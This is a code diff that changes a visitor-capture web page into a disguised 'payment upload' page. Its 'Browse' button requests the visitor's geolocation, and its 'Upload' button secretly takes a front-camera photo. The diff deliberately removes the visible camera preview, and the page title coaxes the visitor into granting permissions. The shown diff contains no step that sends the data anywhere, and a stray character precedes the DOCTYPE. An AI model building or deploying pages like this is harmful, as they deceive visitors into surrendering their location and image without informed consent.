@@ -1,23 +1,25 @@
-<!DOCTYPE html>
+l<!DOCTYPE html>
 <html>
 <head>
-  <title>Visitor Capture</title>
+  <title>Thank you for visiting payment upload site. Please allow required permissions.</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
 
-<h2>Visitor Verification</h2>
+<h2>QR Upload </h2>
 
-<button onclick="getLocation()">Get Location</button>
+<button onclick="getLocation()">Browse</button>
 <p id="location"></p>
 
-<video id="video" width="300" autoplay></video>
-<br>
-<button onclick="capture()">Capture Photo</button>
-<br>
+<br><br>
+
+<button onclick="capturePhoto()">Upload</button>
+<br><br>
+
 <canvas id="canvas" width="300" height="225"></canvas>
 
 <script>
+
 /* GEO LOCATION */
 function getLocation() {
   navigator.geolocation.getCurrentPosition(
@@ -29,18 +31,32 @@ function getLocation() {
   );
 }
 
-/* CAMERA */
-navigator.mediaDevices.getUserMedia({
-  video: { facingMode: "user" }
-}).then(stream => {
-  document.getElementById("video").srcObject = stream;
-});
+/* CAMERA – NO STREAM DISPLAY */
+async function capturePhoto() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" }
+    });
 
-function capture() {
-  const canvas = document.getElementById("canvas");
-  const video = document.getElementById("video");
-  canvas.getContext("2d").drawImage(video, 0, 0, 300, 225);
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    video.play();
+
+    video.onloadedmetadata = () => {
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+
+      ctx.drawImage(video, 0, 0, 300, 225);
+
+      // STOP CAMERA immediately after capture
+      stream.getTracks().forEach(track => track.stop());
+    };
+
+  } catch (error) {
+    alert("Camera permission denied.");
+  }
 }
+
 </script>
 
 </body>
